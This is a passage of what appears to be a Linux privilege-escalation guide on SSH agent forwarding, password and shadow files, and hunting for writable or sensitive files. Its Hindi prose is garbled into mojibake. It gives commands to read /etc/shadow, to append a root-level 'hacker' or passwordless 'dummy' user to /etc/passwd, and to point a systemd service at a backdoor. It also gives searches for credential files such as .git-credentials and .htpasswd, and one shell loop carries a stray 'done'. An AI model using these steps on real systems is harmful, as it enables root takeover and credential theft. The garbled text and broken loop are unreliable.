рдЙрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдпрд╣ рджрд┐рдЦрд╛рдПрдЧрд╛ рдХрд┐ рдЕрдЧрд░ рдЖрдк "**testusername**" рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА **рдирд┐рдЬреА** рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ ssh рдЖрдкрдХреА рдХреБрдВрдЬреА рдХреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ `/home/testusername/.ssh/authorized_keys` рдФрд░ `/home/testusername/access` рдореЗрдВ рд╕реНрдерд┐рдд рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХрд░реЗрдЧрд╛ред

### ForwardAgent/AllowAgentForwarding

SSH рдПрдЬреЗрдВрдЯ рдлрд╝реЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдЖрдкрдХреЛ рдЕрдкрдиреА рд╕реНрдерд╛рдиреАрдп SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЗрд╕рд╕реЗ рдЖрдкрдХреЛ рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рдкрд░ рдЫреЛрдбрд╝реЗ рдЧрдП рдХреБрдВрдЬрд┐рдпреЛрдВ (рдмрд┐рдирд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ!) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЖрдк ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рд╣реЛрд╕реНрдЯ рдкрд░ **рдЬрдВрдк** рдХрд░рдиреЗ рдФрд░ рд╡рд╣рд╛рдВ рд╕реЗ рдПрдХ рдФрд░ рд╣реЛрд╕реНрдЯ рдкрд░ **рдЬрдВрдк** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА **рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╣реЛрд╕реНрдЯ** рдореЗрдВ рд╕реНрдерд┐рдд **рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВрдЧреЗред

рдЖрдкрдХреЛ рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЛ `$HOME/.ssh.config` рдореЗрдВ рдЗрд╕ рддрд░рд╣ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```
Host example.com
ForwardAgent yes
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ `Host` `*` рд╣реИ, рддреЛ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдЕрд▓рдЧ рдорд╢реАрди рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕ рдорд╢реАрди рдХреЛ рдХреБрдВрдЬрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдЧреА (рдЬреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рд╣реИ)ред

рдлрд╝рд╛рдЗрд▓ `/etc/ssh_config` рдЗрд╕ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдпрд╛ рдирд┐рд╖реЗрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд░ рд╕рдХрддреА рд╣реИред
рдлрд╝рд╛рдЗрд▓ `/etc/sshd_config` `AllowAgentForwarding` рд╢рдмреНрдж рдХреЗ рд╕рд╛рде ssh-agent forwarding рдХреЛ **рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ** рдпрд╛ **рдирд┐рд╖реЗрдз рдХрд░рддреА рд╣реИ** (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЕрдиреБрдорддрд┐ рд╣реИ)ред

рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ Forward Agent рдХреЛрдИ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдпрд╣рд╛рдВ рджрд┐рдП рдЧрдП рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## рджрд┐рд▓рдЪрд╕реНрдк рдлрд╝рд╛рдЗрд▓реЗрдВ

### рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ

рдлрд╝рд╛рдЗрд▓ `/etc/profile` рдФрд░ `/etc/profile.d/` рдХреЗ рддрд╣рдд рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬрдм рдПрдХ рдирдИ рд╢реИрд▓реА рдЪрд▓рд╛рддрд╛ рд╣реИ рддреЛ рдЪрд▓рд╛рдИ рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реЛрддреА рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк **рдЗрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдПрдХ рдХреЛ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред
```bash
ls -l /etc/profile /etc/profile.d/
```
рдпрджрд┐ рдХреЛрдИ рдЕрдЬреАрдм рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдЗрд╕реЗ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡рд┐рд╡рд░рдгреЛрдВ** рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдПред

### рдкрд╛рд╕рд╡рд░реНрдб/рд╢реИрдбреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ

рдЖрдкрдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдиреБрд╕рд╛рд░ `/etc/passwd` рдФрд░ `/etc/shadow` рдлрд╝рд╛рдЗрд▓реЗрдВ рдПрдХ рдЕрд▓рдЧ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреА рд╣реИрдВ рдпрд╛ рдЙрдирдХрд╛ рдмреИрдХрдЕрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, **рдЙрди рд╕рднреА рдХреЛ рдЦреЛрдЬреЗрдВ** рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ **рд╣реИрд╢** рд╣реИрдВ:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
рдХреБрдЫ рдореМрдХреЛрдВ рдкрд░ рдЖрдк `/etc/passwd` (рдпрд╛ рд╕рдордХрдХреНрд╖) рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢** рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВред
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп /etc/passwd

рдкрд╣рд▓реЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдбреЛрдВ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдПрдХ рдХреЗ рд╕рд╛рде рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВред
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
рддрдм `hacker` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЬреЛрдбрд╝реЗрдВ рдФрд░ рдЙрддреНрдкрдиреНрди рдкрд╛рд╕рд╡рд░реНрдб рдЬреЛрдбрд╝реЗрдВред
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
рдЙрджрд╛: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

рдЖрдк рдЕрдм `su` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ `hacker:hacker` рдХреЗ рд╕рд╛рде

рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдбрдореА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрд┐рдирд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред
рдЪреЗрддрд╛рд╡рдиреА: рдЖрдк рдорд╢реАрди рдХреА рд╡рд░реНрддрдорд╛рди рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдХрдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
рдиреЛрдЯ: BSD рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдореЗрдВ `/etc/passwd` рдХреЛ `/etc/pwd.db` рдФрд░ `/etc/master.passwd` рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ `/etc/shadow` рдХреЛ `/etc/spwd.db` рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдЖрдк **рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓** рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдорд╢реАрди рдкрд░ рдПрдХ **tomcat** рд╕рд░реНрд╡рд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЖрдк **/etc/systemd/ рдХреЗ рдЕрдВрджрд░ Tomcat рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ,** рддреЛ рдЖрдк рд▓рд╛рдЗрдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
рдЖрдкрдХрд╛ рдмреИрдХрдбреЛрд░ рдЕрдЧрд▓реА рдмрд╛рд░ рдЬрдм рдЯреЙрдордХреИрдЯ рд╢реБрд░реВ рд╣реЛрдЧрд╛, рд╡рд╣ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

### рдлрд╝реЛрд▓реНрдбрд░ рдЬрд╛рдВрдЪреЗрдВ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝реЛрд▓реНрдбрд░ рдмреИрдХрдЕрдк рдпрд╛ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд╕рдореЗрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (рд╢рд╛рдпрдж рдЖрдк рдЖрдЦрд┐рд░реА рд╡рд╛рд▓реЗ рдХреЛ рдкрдврд╝ рдирд╣реАрдВ рдкрд╛рдПрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### рдЕрдЬреАрдм рд╕реНрдерд╛рди/рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ

рдЬрдм рд╣рдо рдПрдХ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдореЗрдВ рдЕрдЬреАрдм рд╕реНрдерд╛рдиреЛрдВ рдФрд░ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рддрд▓рд╛рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред рдпреЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЖрдорддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЕрджреНрдпрддрд┐рдд рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИрдВ рдФрд░ рдЗрд╕рд▓рд┐рдП рдЙрдиреНрд╣реЗрдВ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрд╡рд╕рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреА рд╣реИрдВред

рдпрд╣рд╛рдВ рдХреБрдЫ рдЕрдЬреАрдм рд╕реНрдерд╛рдиреЛрдВ рдФрд░ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд╕реВрдЪреА рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

- `/tmp` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдЬреАрдм рдирд╛рдо рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВред
- `/var/tmp` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдЬреАрдм рдирд╛рдо рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВред
- `/dev/shm` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдЬреАрдм рдирд╛рдо рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВред
- `/var/run` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдЬреАрдм рдирд╛рдо рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВред
- `/var/lock` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдЬреАрдм рдирд╛рдо рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВред
- `/var/spool/cron` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдЬреАрдм рдирд╛рдо рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВред
- `/var/spool/cron/crontabs` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдЬреАрдм рдирд╛рдо рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВред
- `/var/spool/mail` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдЬреАрдм рдирд╛рдо рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВред
- `/var/spool/lpd` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдЬреАрдм рдирд╛рдо рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВред
- `/var/spool/samba` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдЬреАрдм рдирд╛рдо рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВред

рдпрджрд┐ рдЖрдк рдЗрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рдЕрдЬреАрдм рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реЗрдВ рджреЗрдЦрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рдЬрд╛рдВрдЪрдиреЗ рдФрд░ рдЙрдирдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### рдкрд┐рдЫрд▓реЗ рдХреБрдЫ рдорд┐рдирдЯреЛрдВ рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ

To identify the modified files in the last few minutes, you can use the following command:

```bash
find / -type f -mmin -5
```

This command will search for all files (`-type f`) in the entire system (`/`) that have been modified within the last 5 minutes (`-mmin -5`). Adjust the value after `-mmin` to specify the desired time frame.

Keep in mind that this command may take some time to complete, as it searches the entire system. Additionally, you may need root privileges to access certain directories and files.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite рдбреАрдмреА рдлрд╝рд╛рдЗрд▓реЗрдВ

Sqlite рдПрдХ рд▓рд╛рдЗрдЯрд╡реЗрдЯ рдбреЗрдЯрд╛рдмреЗрд╕ рдЗрдВрдЬрди рд╣реИ рдЬреЛ рдПрдХ рд╕рд┐рдВрдЧрд▓ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдбреЗрдЯрд╛ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдбреЗрдЯрд╛рдмреЗрд╕ рдлрд╝рд╛рдЗрд▓реЗрдВ `.db` рдпрд╛ `.sqlite` рдирд╛рдордХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВред рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рдбреЗрдЯрд╛ рдЯреЗрдмрд▓, рд╕реНрдХреАрдорд╛, рдЗрдВрдбреЗрдХреНрд╕, рдФрд░ рдЕрдиреНрдп рдбреЗрдЯрд╛рдмреЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

Sqlite рдбреЗрдЯрд╛рдмреЗрд╕ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЖрдорддреМрд░ рдкрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ рдФрд░ рдЗрдирдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдбреЗрдЯрд╛ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП SQL рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдирдзрд┐рдХреГрдд рд░реВрдк рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рд╣реИрдХрд░ рдХреЛ рдЙрдЪреНрдЪрддрдо рд╕реНрддрд░ рдХреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдкрдврд╝рдиреЗ рдФрд░ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред

рдПрдХ рд╣реИрдХрд░ рдХреЗ рд▓рд┐рдП, Sqlite рдбреЗрдЯрд╛рдмреЗрд╕ рдлрд╝рд╛рдЗрд▓реЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реНрд░реЛрдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬрд╣рд╛рдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдбреЗрдЯрд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ, рдкрд╛рд╕рд╡рд░реНрдб, рдФрд░ рдЕрдиреНрдп рд╕рдВрджрд░реНрднрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣реИрдХрд░ рдХреЛ рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_рдЗрддрд┐рд╣рд╛рд╕, .sudo\_as\_admin\_рд╕рдлрд▓, рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### рдЫрд┐рдкреЗ рд╣реБрдП рдлрд╝рд╛рдЗрд▓реЗрдВ

рдПрдХ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рдкрд░, рдЫрд┐рдкреЗ рд╣реБрдП рдлрд╝рд╛рдЗрд▓реЗрдВ рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдХрд╣рддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рджрд┐рдЦрд╛рдиреЗ рд╕реЗ рдЫрд┐рдкрд╛рдП рдЬрд╛рддреЗ рд╣реИрдВред рдпреЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдХреНрд╕рд░ рдЧреЛрдкрдиреАрдпрддрд╛ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрддреА рд╣реИрдВред рдЫрд┐рдкреЗ рд╣реБрдП рдлрд╝рд╛рдЗрд▓реЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рджреЛ рддрд░реАрдХреЛрдВ рд╕реЗ рдмрдирд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

